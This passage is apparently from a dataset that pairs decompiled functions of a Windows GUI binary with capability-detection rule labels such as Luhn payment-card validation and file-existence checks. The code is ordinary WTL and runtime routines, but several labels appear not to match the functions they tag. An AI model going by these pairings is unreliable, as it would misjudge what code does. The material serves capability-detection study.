        "decompiled_code": "\nuint __fastcall fcn.004507cd(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t **ppuVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    char cVar5;\n    uint32_t uVar6;\n    \n    ppuVar2 = param_1[4];\n    param_1[4] = ppuVar2 + 1;\n    puVar3 = *ppuVar2;\n    if ((puVar3 == NULL) || (iVar4 = *(puVar3 + 2),  iVar4 == 0)) {\n        uVar6 = 6;\n        param_1[0xc] = \"(null)\";\n    }\n    else {\n        cVar5 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n        param_1[0xc] = iVar4;\n        uVar1 = *puVar3;\n        uVar6 = uVar1;\n        if (cVar5 != '\\0') {\n            *(param_1 + 0xe) = 1;\n            uVar6 = uVar1 >> 1;\n            goto code_r0x00450827;\n        }\n    }\n    *(param_1 + 0xe) = 0;\ncode_r0x00450827:\n    param_1[0xd] = uVar6;\n    return CONCAT31(uVar6 >> 8, 1);\n}\n",
        "token_count": 332
    },
    "00465ddb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00465ddb(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint arg_10h;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint8_t *puVar10;\n    uint *arg_18h;\n    uint8_t *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    var_18h = arg_8h;\n    var_14h = 0;\n    if ((*(arg_8h + 0xb0) == 0) && (*(arg_8h + 0xac) == 0)) {\n        var_4h = NULL;\n        arg_18h = 0x6cb518;\n    }\n    else {\n        var_10h = 1;\n        arg_18h = fcn.00460ec9(1, 0x50);\n        if (arg_18h == NULL) {\n            return 1;\n        }\n        var_8h = arg_8h + 0x88;\n        puVar12 = *var_8h;\n        puVar13 = arg_18h;\n        for (iVar9 = 0x14; iVar9 != 0; iVar9 = iVar9 + -1) {\n            *puVar13 = *puVar12;\n            puVar12 = puVar12 + 1;\n            puVar13 = puVar13 + 1;\n        }\n        var_4h = fcn.0045d1bf(4);\n        fcn.0045d185(0);\n        if (var_4h == NULL) {\n            fcn.0045d185(arg_18h);\n            return 1;\n        }\n        *var_4h = 0;\n        if (*(arg_8h + 0xb0) != 0) {\n            var_ch = fcn.0045d1bf(4);\n            fcn.0045d185(0);\n            if (var_ch == NULL) {\n                fcn.0045d185(arg_18h);\ncode_r0x00465f29:\n                fcn.0045d185(var_4h);\n                return var_10h;\n            }\n            *var_ch = 0;\n            arg_10h = *(arg_8h + 0xb0);\n            uVar4 = fcn.0046f589(&var_18h, 1, arg_10h, 0xe, arg_18h);\n            uVar5 = fcn.0046f589(&var_18h, 1, arg_10h, 0xf, arg_18h + 1);\n            uVar6 = fcn.0046f589(&var_18h, 1, arg_10h, 0x10, arg_18h + 2);\n            uVar7 = fcn.0046f589(&var_18h, 2, arg_10h, 0xe, arg_18h + 0xc);\n            uVar8 = fcn.0046f589(&var_18h, 2, arg_10h, 0xf, arg_18h + 0xd);\n            if ((uVar8 | uVar4 | uVar5 | uVar6 | uVar7) != 0) {\n                fcn.00465d72(arg_18h);\n                fcn.0045d185(arg_18h);\n                fcn.0045d185(var_ch);\n                var_10h = 0xffffffff;\n                goto code_r0x00465f29;\n            }\n            puVar10 = arg_18h[2];\n            while (uVar2 = *puVar10,  uVar2 != 0) {\n                if (uVar2 - 0x30 < 10) {\n                    *puVar10 = uVar2 - 0x30;\ncode_r0x00465f4a:\n                    puVar10 = puVar10 + 1;\n                }\n                else {\n                    puVar11 = puVar10;\n                    if (uVar2 != 0x3b) goto code_r0x00465f4a;\n                    do {\n                        puVar1 = puVar11 + 1;\n                        *puVar11 = *puVar1;\n                        puVar11 = puVar11 + 1;\n                    } while (*puVar1 != 0);\n                }\n            }\n            *var_4h = 1;\n            *var_ch = 1;\n            puVar12 = var_ch;\n            goto code_r0x00465faf;\n        }\n        *arg_18h = *0x6cb518;\n        arg_18h[1] = *0x6cb51c;\n        arg_18h[2] = *0x6cb520;\n        arg_18h[0xc] = *0x6cb548;\n        arg_18h[0xd] = *0x6cb54c;\n        *var_4h = 1;\n    }\n    var_8h = arg_8h + 0x88;\n    puVar12 = NULL;\ncode_r0x00465faf:\n    piVar3 = *(arg_8h + 0x80);\n    if (piVar3 != NULL) {\n        LOCK();\n        *piVar3 = *piVar3 + -1;\n    }\n    piVar3 = *(arg_8h + 0x7c);\n    if (piVar3 != NULL) {\n        LOCK();\n        iVar9 = *piVar3;\n        *piVar3 = iVar9 + -1;\n        if (iVar9 + -1 == 0) {\n            fcn.0045d185(*(arg_8h + 0x7c));\n            fcn.0045d185(*var_8h);\n        }\n    }\n    *(arg_8h + 0x7c) = var_4h;\n    *(arg_8h + 0x80) = puVar12;\n    *var_8h = arg_18h;\n    return 0;\n}\n",
        "token_count": 1424
    },
    "0040f040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040f040(int32_t param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = 0;\n    uVar1 = *(param_1 + 0x44);\n    if (0 < *(param_1 + 0x50)) {\n        do {\n            var_8h = 0;\n            _var_28h = 0;\n            _var_20h = 0;\n            _var_18h = 0;\n            _var_10h = 0;\n            var_30h = 0x30;\n            var_2ch = 0x80;\n            var_4h = 0;\n            if ((iVar3 < 0) || (*(param_1 + 0x50) <= iVar3)) {\n                fcn.00402f30(0x8000000b);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            (*_sym.imp.USER32.dll_SetMenuItemInfoW)(uVar1, *(*(param_1 + 0x4c) + iVar3 * 2), 0, &var_30h);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < *(param_1 + 0x50));\n    }\n    return;\n}\n",
        "token_count": 367
    },
    "004360bf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004360bf(uint *arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    char *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    _var_10h = fcn.00434d1b(0);\n    fcn.00434593(&var_10h);\n    cVar1 = **0x6ccc1c;\n    if (cVar1 == '\\0') {\n        fcn.00434c13(1);\n    }\n    else {\n        *0x6ccc1c = *0x6ccc1c + 1;\n        if (cVar1 == '0') {\n            var_10h = \"void\";\n            var_ch = 4;\n            fcn.00434aab(&var_10h);\n        }\n        else if (cVar1 == '2') {\n            arg_8h_00 = fcn.004394b9(&var_10h);\n            fcn.00434b03(arg_8h_00);\n        }\n        else if (cVar1 == '5') {\n            fcn.00434635(2);\n            return arg_8h;\n        }\n    }\n    var_10h = 0x47dc44;\n    var_ch = 2;\n    fcn.00434aab(&var_10h);\n    *arg_8h = var_8h;\n    arg_8h[1] = var_4h;\n    return arg_8h;\n}\n",
        "token_count": 345
    },
    "004620d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid __cdecl fcn.004620d8(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    int16_t *piVar8;\n    int16_t **ppiVar9;\n    int16_t **ppiVar10;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int16_t **var_24h;\n    int16_t **var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int16_t *var_10h;\n    int32_t var_ch;\n    ushort var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    if (arg_ch == NULL) {\n        puVar4 = fcn.0043bcb5();\n        *puVar4 = 0x16;\n        fcn.0043bb3e();\n    }\n    else {\n        *arg_ch = 0;\n        iVar5 = *arg_8h;\n        var_24h = NULL;\n        var_20h = NULL;\n        var_1ch = 0;\n        ppiVar10 = var_24h;\n        while (var_24h = ppiVar10,  iVar5 != 0) {\n            var_ch = 0x3f002a;\n            var_8h = 0;\n            iVar5 = fcn.004666e0(iVar5, &var_ch);\n            if (iVar5 == 0) {\n                iVar5 = fcn.004614ee(*arg_8h, 0, 0, &var_24h);\n            }\n            else {\n                iVar5 = fcn.00461827(*arg_8h, iVar5, &var_24h);\n            }\n            if (iVar5 != 0) goto code_r0x0046138c;\n            arg_8h = arg_8h + 1;\n            ppiVar10 = var_24h;\n            iVar5 = *arg_8h;\n        }\n        iVar5 = (var_20h - ppiVar10 >> 2) + 1;\n        var_14h = 0;\n        for (ppiVar9 = ppiVar10; ppiVar9 != var_20h; ppiVar9 = ppiVar9 + 1) {\n            piVar7 = *ppiVar9;\n            var_10h = piVar7 + 1;\n            do {\n                iVar2 = *piVar7;\n                piVar7 = piVar7 + 1;\n            } while (iVar2 != 0);\n            var_14h = var_14h + 1 + (piVar7 - var_10h >> 1);\n        }\n        iVar6 = fcn.00457505(iVar5, var_14h, 2);\n        ppiVar9 = var_20h;\n        if (iVar6 == 0) {\n            fcn.0045d185(0);\ncode_r0x0046138c:\n            fcn.00461bef();\n        }\n        else {\n            piVar7 = iVar6 + iVar5 * 4;\n            var_10h = piVar7;\n            if (ppiVar10 != var_20h) {\n                var_ch = iVar6 - ppiVar10;\n                do {\n                    piVar8 = *ppiVar10;\n                    piVar1 = piVar8 + 1;\n                    do {\n                        iVar2 = *piVar8;\n                        piVar8 = piVar8 + 1;\n                    } while (iVar2 != 0);\n                    var_18h = (piVar8 - piVar1 >> 1) + 1;\n                    iVar5 = fcn.0043bf88(var_10h, var_14h - (var_10h - piVar7 >> 1), *ppiVar10, var_18h);\n                    if (iVar5 != 0) {\n                        fcn.0043bb6b(0, 0, 0, 0, 0);\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\n                    *(var_ch + ppiVar10) = var_10h;\n                    ppiVar10 = ppiVar10 + 1;\n                    var_10h = var_10h + var_18h;\n                } while (ppiVar10 != ppiVar9);\n            }\n            *arg_ch = iVar6;\n            fcn.0045d185(0);\n            fcn.00461bef();\n        }\n    }\n    fcn.004303e9(arg_ch);\n    return;\n}\n",
        "token_count": 1098
    },
    "00402ad0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402ad0(uint32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t arg_8h_00;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    \n    arg_8h_00 = arg_8h * 2;\n    if (arg_8h * 2 >> 0x20 != 0) {\n        fcn.00402f30(0x80070216);\n        pcVar1 = swi(3);\n        iVar2 = (*pcVar1)();\n        return iVar2;\n    }\n    if (arg_8h_00 < 0x401) {\n        *in_ECX = in_ECX + 1;\n        return in_ECX + 1;\n    }\n    fcn.00402bb0(arg_8h_00);\n    return *in_ECX;\n}\n",
        "token_count": 197
    },
    "00402be0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402be0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    \n    iVar4 = arg_ch + 1 + *in_ECX;\n    if ((*in_ECX < iVar4) && (arg_ch < iVar4)) {\n        uVar3 = in_ECX[1];\n        if (in_ECX[1] <= iVar4) {\n            do {\n                if (0x3fffffff < uVar3) {\n                    return 0;\n                }\n                uVar2 = uVar3 * 2;\n                in_ECX[1] = uVar2;\n                iVar1 = uVar3 * -2;\n                uVar3 = uVar2;\n            } while (SBORROW4(iVar4, uVar2) == iVar4 + iVar1 < 0);\n            if (uVar2 * 2 >> 0x20 != 0) {\n                return 0;\n            }\n            iVar4 = (*_sym.imp.ole32.dll_CoTaskMemRealloc)(in_ECX[2], uVar2 * 2);\n            if (iVar4 == 0) {\n                return 0;\n            }\n            in_ECX[2] = iVar4;\n        }\n        iVar4 = *in_ECX;\n        if (((-1 < iVar4) && (iVar1 = in_ECX[1],  iVar4 < iVar1)) && (iVar1 - iVar4 <= iVar1)) {\n            fcn.0040f0d0(in_ECX[2] + iVar4 * 2, (iVar1 - iVar4) * 2, arg_8h, arg_ch * 2);\n            *in_ECX = *in_ECX + arg_ch;\n            *(in_ECX[2] + *in_ECX * 2) = 0;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 447
    },
    "00405b10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405b10(uint *hdc, uint lprc, int32_t lpString, uint crColor)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString);\n    iVar2 = 0;\n    iVar3 = -1;\n    if (0 < iVar1) {\n        do {\n            iVar3 = iVar2;\n            if (*(lpString + iVar2 * 2) == 9) break;\n            iVar2 = iVar2 + 1;\n            iVar3 = -1;\n        } while (iVar2 < iVar1);\n    }\n    (*_sym.imp.GDI32.dll_SetTextColor)(*hdc, crColor);\n    (*_sym.imp.USER32.dll_DrawTextW)(*hdc, lpString, iVar3, lprc, ~(*(in_ECX + 0x85) << 0x12) & 0x100000 | 0x24);\n    if (iVar3 != -1) {\n        (*_sym.imp.USER32.dll_DrawTextW)\n                  (*hdc, lpString + 2 + iVar3 * 2, 0xffffffff, lprc, ~(*(in_ECX + 0x85) << 0x12) & 0x100000 | 0x26);\n    }\n    return;\n}\n",
        "token_count": 322
    },
    "00405e10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405e10(int32_t arg_8h)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    iVar6 = *0x6cc6dc + 0x10;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar6);\n    ppiVar1 = *(in_ECX + 0x34);\n    iVar5 = 0;\n    piVar2 = ppiVar1[2];\n    if (0 < piVar2) {\n        piVar4 = *ppiVar1;\n        do {\n            if (*piVar4 == arg_8h) {\n                if (iVar5 != -1) {\n                    if ((-1 < iVar5) && (iVar5 < piVar2)) {\n                        iVar5 = ppiVar1[1][iVar5];\n                        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar6);\n                        return iVar5;\n                    }\n                    fcn.00402f30(0x8000000b);\n                    pcVar3 = swi(3);\n                    iVar5 = (*pcVar3)();\n                    return iVar5;\n                }\n                break;\n            }\n            iVar5 = iVar5 + 1;\n            piVar4 = piVar4 + 1;\n        } while (iVar5 < piVar2);\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar6);\n    return 0;\n}\n",
        "token_count": 352
    },
    "00405e90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3ch\n\nvoid __cdecl fcn.00405e90(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint unaff_ESI;\n    int32_t iVar2;\n    uint var_3ch;\n    uint lpRect;\n    int32_t var_30h;\n    uint var_28h;\n    int32_t var_20h;\n    uint lParam;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    if (arg_8h == -1) {\n        fcn.004303e9(var_3ch);\n        return;\n    }\n    _lpRect = ZEXT816(0);\n    (*_sym.imp.USER32.dll_GetClientRect)(*(in_ECX + 4), &lpRect);\n    iVar1 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(in_ECX + 0x44));\n    for (iVar2 = arg_8h + 1; iVar2 != arg_8h; iVar2 = iVar2 + 1) {\n        var_8h = 0;\n        if (iVar1 <= iVar2) {\n            iVar2 = 0;\n        }\n        _lParam = ZEXT816(0);\n        (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x417, iVar2, &lParam);\n        _var_28h = ZEXT816(0);\n        (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x41d, iVar2, &var_28h);\n        if ((var_30h < var_20h) || (((_lParam & 0x4) != 0x0 && ((_lParam & 0x8) == 0x0)))) break;\n    }\n    fcn.004303e9(unaff_ESI);\n    return;\n}\n",
        "token_count": 455
    },
    "00405f70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpRect\n\nvoid __cdecl fcn.00405f70(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint unaff_EDI;\n    uint lpRect;\n    int32_t var_30h;\n    uint var_28h;\n    int32_t var_20h;\n    uint lParam;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    if (arg_8h == -1) {\n        fcn.004303e9(lpRect);\n        return;\n    }\n    _lpRect = ZEXT816(0);\n    (*_sym.imp.USER32.dll_GetClientRect)(*(in_ECX + 4), &lpRect);\n    for (iVar1 = arg_8h + -1; iVar1 != arg_8h; iVar1 = iVar1 + -1) {\n        if (iVar1 < 0) {\n            iVar1 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(in_ECX + 0x44));\n            iVar1 = iVar1 + -1;\n        }\n        var_8h = 0;\n        _lParam = ZEXT816(0);\n        (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x417, iVar1, &lParam);\n        _var_28h = ZEXT816(0);\n        (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x41d, iVar1, &var_28h);\n        if ((var_30h < var_20h) || (((_lParam & 0x4) != 0x0 && ((_lParam & 0x8) == 0x0)))) break;\n    }\n    fcn.004303e9(unaff_EDI);\n    return;\n}\n",
        "token_count": 440
    },
    "00406450": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00406450(void)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    if (*(*(*(in_FS_OFFSET + 0x2c) + *0x6ccba4 * 4) + 4) < *0x6cc7c4) {\n        fcn.004302f2(0x6cc7c4);\n        if (*0x6cc7c4 == -1) {\n            *0x6c9cc8 = L\"ToolbarWindow32\";\n            *0x6c9ccc = 0;\n            *0x6c9cd0 = 0;\n            *0x6c9cd4 = 1;\n            *0x6c9cd8 = 0;\n            fcn.00431db0(0x6c9cdc, 0, 0x48);\n            fcn.004302a8(0x6cc7c4);\n        }\n    }\n    return 0x6c9c98;\n}\n",
        "token_count": 218
    },
    "004067a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004067a0(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    int32_t **in_ECX;\n    int32_t iVar4;\n    \n    piVar1 = in_ECX[2];\n    iVar4 = 0;\n    if (0 < piVar1) {\n        piVar3 = *in_ECX;\n        do {\n            if (*piVar3 == *arg_8h) {\n                if (iVar4 == -1) {\n                    return 0;\n                }\n                if ((-1 < iVar4) && (iVar4 < piVar1)) {\n                    return in_ECX[1][iVar4];\n                }\n                fcn.00402f30(0x8000000b);\n                pcVar2 = swi(3);\n                iVar4 = (*pcVar2)();\n                return iVar4;\n            }\n            iVar4 = iVar4 + 1;\n            piVar3 = piVar3 + 1;\n        } while (iVar4 < piVar1);\n    }\n    return 0;\n}\n",
        "token_count": 252
    },
    "004078b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004078b0(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    uint *puVar6;\n    int32_t in_ECX;\n    int32_t iVar7;\n    uint32_t uVar8;\n    \n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    iVar4 = fcn.00405e10(uVar3);\n    iVar7 = 0;\n    iVar2 = *(iVar4 + 8);\n    if (0 < iVar2) {\n        puVar5 = *(iVar4 + 4);\n        do {\n            if (*puVar5 == (-(in_ECX != 0) & in_ECX + 0x68U)) {\n                if (((iVar7 != -1) && (-1 < iVar7)) && (iVar7 < iVar2)) {\n                    if (iVar7 != iVar2 + -1) {\n                        uVar8 = (iVar2 - iVar7) * 4;\n                        iVar2 = *(iVar4 + 4) + iVar7 * 4;\n                        uVar1 = uVar8 - 4;\n                        if (uVar1 == 0) {\ncode_r0x00407962:\n                            uVar3 = 0;\n                        }\n                        else if ((iVar2 == 0) || (iVar2 + 4 == 0)) {\n                            puVar6 = fcn.0043bcb5();\n                            *puVar6 = 0x16;\n                            fcn.0043bb3e();\n                            uVar3 = 0x16;\n                        }\n                        else {\n                            if (uVar1 <= uVar8) {\n                                fcn.00431830(iVar2, iVar2 + 4, uVar1);\n                                goto code_r0x00407962;\n                            }\n                            puVar6 = fcn.0043bcb5();\n                            *puVar6 = 0x22;\n                            fcn.0043bb3e();\n                            uVar3 = 0x22;\n                        }\n                        fcn.00402c90(uVar3);\n                    }\n                    *(iVar4 + 8) = *(iVar4 + 8) + -1;\n                }\n                break;\n            }\n            iVar7 = iVar7 + 1;\n            puVar5 = puVar5 + 1;\n        } while (iVar7 < iVar2);\n    }\n    iVar2 = *(iVar4 + 0x14);\n    iVar7 = 0;\n    if (0 < iVar2) {\n        puVar5 = *(iVar4 + 0x10);\n        do {\n            if (*puVar5 == (-(in_ECX != 0) & in_ECX + 0x6cU)) {\n                if (((iVar7 != -1) && (-1 < iVar7)) && (iVar7 < iVar2)) {\n                    if (iVar7 != iVar2 + -1) {\n                        puVar5 = *(iVar4 + 0x10) + iVar7;\n                        uVar8 = (iVar2 - iVar7) * 4;\n                        uVar1 = uVar8 - 4;\n                        if (uVar1 == 0) {\ncode_r0x00407a09:\n                            uVar3 = 0;\n                        }\n                        else if ((puVar5 == NULL) || (puVar5 + 1 == NULL)) {\n                            puVar6 = fcn.0043bcb5();\n                            *puVar6 = 0x16;\n                            fcn.0043bb3e();\n                            uVar3 = 0x16;\n                        }\n                        else {\n                            if (uVar1 <= uVar8) {\n                                fcn.00431830(puVar5, puVar5 + 1, uVar1);\n                                goto code_r0x00407a09;\n                            }\n                            puVar6 = fcn.0043bcb5();\n                            *puVar6 = 0x22;\n                            fcn.0043bb3e();\n                            uVar3 = 0x22;\n                        }\n                        fcn.00402c90(uVar3);\n                    }\n                    *(iVar4 + 0x14) = *(iVar4 + 0x14) + -1;\n                }\n                break;\n            }\n            iVar7 = iVar7 + 1;\n            puVar5 = puVar5 + 1;\n        } while (iVar7 < iVar2);\n    }\n    *arg_14h = 0;\n    return 1;\n}\n",
        "token_count": 1010
    },
    "0040d2b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040d2b0(uint noname_0, uint nCmdShow)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint arg_8h;\n    code *var_1b0h;\n    int32_t var_1ach;\n    int32_t var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint lpMsg;\n    uint var_18ch;\n    uint var_184h;\n    uint var_17ch;\n    int32_t lpCriticalSection;\n    uint var_174h;\n    uint hWnd;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    iVar6 = *0x6cc6dc + 0x10;\n    var_1b0h = vtable.WTL::CMessageLoop.0;\n    _var_1ach = ZEXT816(0);\n    var_19ch = 0;\n    var_198h = 0;\n    _lpMsg = ZEXT816(0);\n    var_17ch = 0;\n    _var_184h = 0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar6);\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    ppiVar3 = *0x6cc7ac;\n    piVar5 = fcn.0043bd7a(**0x6cc7ac, (*0x6cc7ac)[2] + 1, 4);\n    if (piVar5 != NULL) {\n        *ppiVar3 = piVar5;\n        piVar5 = fcn.0043bd7a(ppiVar3[1], ppiVar3[2] + 1, 4);\n        if (piVar5 != NULL) {\n            ppiVar3[1] = piVar5;\n            piVar5 = ppiVar3[2];\n            if (*ppiVar3 + piVar5 != NULL) {\n                (*ppiVar3)[piVar5] = iVar4;\n            }\n            if (ppiVar3[1] + piVar5 != NULL) {\n                ppiVar3[1][piVar5] = &var_1b0h;\n            }\n            ppiVar3[2] = ppiVar3[2] + 1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar6);\n    fcn.004016a0();\n    arg_8h = 0;\n    iVar4 = fcn.00403650(0, 0, 0, 0, 0);\n    if (iVar4 != 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(hWnd, nCmdShow);\n        pcVar2 = _sym.imp.USER32.dll_PeekMessageW;\n        do {\n            iVar4 = 0;\n            bVar1 = true;\n            do {\n                do {\n                    if (bVar1) {\n                        do {\n                            iVar6 = (*pcVar2)(&lpMsg, 0, 0, 0, 0);\n                            if (iVar6 != 0) goto code_r0x0040d400;\n                            iVar6 = (**(var_1b0h + 8))(iVar4);\n                            iVar4 = iVar4 + 1;\n                        } while (iVar6 != 0);\n                        bVar1 = false;\n                    }\ncode_r0x0040d400:\n                    iVar6 = (*_sym.imp.USER32.dll_GetMessageW)(&lpMsg, 0, 0, 0);\n                } while (iVar6 == -1);\n                if (iVar6 == 0) {\n                    lpCriticalSection = *0x6cc6dc + 0x10;\n                    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n                    iVar6 = 0;\n                    if ((*0x6cc7ac)[2] < 1) goto code_r0x0040d4c0;\n                    piVar5 = **0x6cc7ac;\n                    goto code_r0x0040d4a5;\n                }\n                iVar6 = (**(var_1b0h + 4))(&lpMsg);\n                if (iVar6 == 0) {\n                    (*_sym.imp.USER32.dll_TranslateMessage)(&lpMsg);\n                    (*_sym.imp.USER32.dll_DispatchMessageW)(&lpMsg);\n                }\n                iVar6 = (**(var_1b0h + 0xc))(&lpMsg);\n            } while (iVar6 == 0);\n        } while( true );\n    }\n    goto code_r0x0040d4cc;\n    while( true ) {\n        iVar6 = iVar6 + 1;\n        piVar5 = piVar5 + 1;\n        if ((*0x6cc7ac)[2] <= iVar6) break;\ncode_r0x0040d4a5:\n        if (*piVar5 == iVar4) {\n            if (iVar6 != -1) {\n                fcn.0040d160(iVar6);\n            }\n            break;\n        }\n    }\ncode_r0x0040d4c0:\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection);\ncode_r0x0040d4cc:\n    fcn.00401ce0();\n    var_1b0h = vtable.WTL::CMessageLoop.0;\n    if (var_1a0h != 0) {\n        fcn.0043bd54(var_1a0h);\n        _var_1ach = _var_1ach & 0xffffffffffffffff;\n    }\n    var_19ch = 0;\n    var_198h = 0;\n    if (var_1ach != 0) {\n        fcn.0043bd54(var_1ach);\n    }\n    fcn.004303e9(arg_8h);\n    return;\n}\n",
        "token_count": 1355
    },
    "00432c88": {
        "rules": [
